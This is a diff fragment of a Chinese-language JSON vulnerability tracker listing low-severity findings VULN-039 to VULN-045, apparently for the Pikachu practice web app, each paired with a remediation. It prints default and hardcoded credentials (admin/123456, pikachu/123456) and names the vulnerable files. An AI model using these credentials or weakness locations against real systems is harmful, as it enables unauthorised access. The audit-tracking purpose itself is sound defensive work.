+      { "level": "Low低危", "seq": 39, "name": "默认口令漏洞", "detail": "admin/123456 等默认账号公开", "id": "VULN-039", "fix": "强制改密+移除测试账号", "status": "", "retest": "" },
+      { "level": "Low低危", "seq": 40, "name": "开放重定向漏洞", "detail": "urlredirect.php url 直接跳转", "id": "VULN-040", "fix": "跳转白名单", "status": "", "retest": "" },
+      { "level": "Low低危", "seq": 41, "name": "用户枚举+弱哈希认证漏洞", "detail": "findabc.php 提示差异+MD5 Cookie", "id": "VULN-041", "fix": "统一提示+会话标识+强哈希", "status": "", "retest": "" },
+      { "level": "Low低危", "seq": 42, "name": "敏感信息泄露漏洞（phpinfo）", "detail": "phpinfo.php 暴露服务器配置", "id": "VULN-042", "fix": "删除 phpinfo 文件", "status": "", "retest": "" },
+      { "level": "Low低危", "seq": 43, "name": "错误信息泄露漏洞（SQL报错回显）", "detail": "execute() 直接输出 mysqli_error", "id": "VULN-043", "fix": "关闭 display_errors+日志化", "status": "", "retest": "" },
+      { "level": "Low低危", "seq": 44, "name": "硬编码数据库凭证漏洞", "detail": "config.inc.php pikachu/123456", "id": "VULN-044", "fix": "环境变量注入+最小权限", "status": "", "retest": "" },
+      { "level": "提示", "seq": 45, "name": "缺少安全响应头漏洞", "detail": "无 CSP/X-Frame-Options 等", "id": "VULN-045", "fix": "全局安全响应头", "status": "", "retest": "" }
+    ]
+  }
+}
